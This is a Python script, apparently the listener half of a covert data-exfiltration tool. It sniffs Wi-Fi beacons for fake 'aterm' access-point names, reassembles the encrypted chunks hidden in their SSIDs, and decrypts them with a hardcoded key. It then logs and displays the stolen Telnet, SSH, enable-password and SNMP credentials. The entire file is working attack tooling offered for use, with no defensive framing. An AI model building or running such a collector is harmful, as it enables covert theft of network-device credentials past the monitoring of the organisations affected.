#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import os
import re
import signal
import argparse
import pyaes
import pyscrypt
import pygame
import collections
import time
from scapy.all import Dot11, Dot11Elt, Dot11Beacon, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.2"

# Define Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'

# Setup
motd = 'jaula-logo'
DEBUG = False
TFT = False
pktlen = 0
pkttotal = 0
dic = {}
cnt = True
sid = []
cred = []
fd = ''
WHITE = (255, 255, 255)


# Functions
def tftinit():
    os.putenv('SDL_FBDEV', '/dev/fb1')
    pygame.init()
    pygame.mouse.set_visible(False)
    lcd = pygame.display.set_mode((320, 240))
    lcd.fill((0, 0, 0))
    pygame.display.update()
    return lcd


def tftmsg(lcd, msg, pos, fsize):
    font_big = pygame.font.Font(None, fsize)
    txt = font_big.render(msg, True, WHITE)
    wh = txt.get_rect(center=pos)
    lcd.blit(txt, wh)
    pygame.display.update()


def kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGTERM)


def decrypti(ciphertxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt


def pkt_callback(pkt):
    global pkttotal
    global pktlen
    global dic
    global cnt
    global sid
    global cred
    global fd

    # Look for beacon with SSID 'aterm-c17c02' as starting SSID
    # grab crypto len & amount of SSID's with crypto on it (use -g on those)
    if pkt.haslayer(Dot11Beacon):
        if (pkt[Dot11Elt].info == 'aterm-c17c02') and (cnt):
                pkttotal = pkt[Dot11].SC
                pktlen = pkt[Dot11Beacon].beacon_interval
                cnt = False
        elif ('aterm' and '-g' in pkt[Dot11Elt].info):
                if pkt[Dot11Beacon].beacon_interval == pktlen:
                    if str(pkt[Dot11Elt].info).split('-')[1] not in sid:
                        dic[pkt[Dot11].SC] = str(
                            pkt[Dot11Elt].info).split('-')[1]
                        sid.append(str(pkt[Dot11Elt].info).split('-')[1])
        if (len(dic) == pkttotal) and (pkttotal > 0):
                odic = collections.OrderedDict(sorted(dic.items()))
                final = ''
                for k, v in odic.iteritems():
                        final = final + v
                text = decrypti(final[:pktlen])
                text = text.strip()
                find = re.compile('\\b' + text + '\\b')
                with open(fd, 'a+') as sfile:
                    with open(fd, 'r') as xfile:
                        m = find.findall(xfile.read())
                        if not m:
                            if DEBUG:
                                print('Receive Credentails via Fake-AP:')
                                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                                      time.gmtime()) + text)
                            sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                        time.gmtime()) + text + '\n')
                if TFT:
                    if text not in cred:
                        cred.append(text)
                        if text.startswith('t,e,'):
                            data = ['Telnet:', 'Enable Pass: '
                                    + ','.join([text.split(',')[2:]][0])]
                        elif text.startswith('s,e,'):
                            data = ['SSH:', 'Enable Pass: '
                                    + ','.join([text.split(',')[2:]][0])]
                        elif text.startswith('p,'):
                            data = ['SNMP:', 'Community: '
                                    + ','.join([text.split(',')[1:]][0])]
                        elif text.startswith('t,'):
                            data = ['Telnet:', 'User: '
                                    + text.split(',')[1], 'Pass: '
                                    + ','.join([text.split(',')[2:]][0])]
                        elif text.startswith('s,'):
                            data = ['SSH:', 'User: '
                                    + text.split(',')[1], 'Pass: '
                                    + ','.join([text.split(',')[2:]][0])]
                        kill_process('mplayer')
                        kill_process('fbi')
                        lcd = tftinit()
                        tftmsg(lcd, 'FOUND', (160, 40), 50)
                        tftmsg(lcd, 'CREDENTIALS', (160, 80), 50)
                        q = 0
                        for x in range(len(data)):
                            tftmsg(lcd, data[x], (160, 130 + q), 30)
                            q = q + 30
                dic = {}
                sid = []
                pktlen = 0
                pkttotal = 0
                cnt = True


def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable debugging')
    parser.add_argument('-t', '--tft',
                        action='store_true', help='Enable TFT')
    parser.add_argument('-i', required=True,
                        metavar='<wlan0mon>', dest='wnic', help='wlan int')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output file')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)


def main():
    global fd
    global TFT
    global DEBUG
    opciones = parsingopt()
    if opciones.verbose:
        DEBUG = True
    if opciones.tft:
        TFT = True
    if opciones.fd:
        fd = opciones.fd

    if DEBUG:
        print('Listening.....')

    sniff(iface=opciones.wnic, prn=pkt_callback, store=0)


# Call main
if __name__ == '__main__':
    main()
